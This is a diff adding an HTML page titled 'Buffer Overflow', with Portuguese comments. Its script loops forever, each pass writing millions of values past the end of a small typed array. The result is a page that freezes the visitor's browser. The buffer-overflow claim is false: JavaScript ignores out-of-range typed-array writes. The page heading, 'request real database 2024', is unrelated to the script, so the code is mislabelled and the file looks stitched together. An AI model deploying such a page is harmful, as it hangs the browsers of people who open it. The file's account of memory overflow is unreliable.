@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Buffer Overflow</title>
+</head>
+<body>
+  <script>
+    // Cria um array com o buffer
+    var buffer = new Uint8Array(1000); // Alocação direta com tamanho inicial
+
+    // Loop infinito para multiplicar e somar
+    for (;;) { // Loop infinito mais rápido
+      // Multiplica o tamanho do buffer por si mesmo
+      var size = buffer.length * buffer.length;
+
+      // Adiciona o resultado ao buffer
+      for (var i = 0; i < size * 10; i++) { // Adiciona mais elementos
+        buffer[i] = i; // Escreve no buffer sem verificação de limite
+      }
+    }
+  </script>
+  <h1>pedir base dados real 2024</h1>
+</body>
+</html>
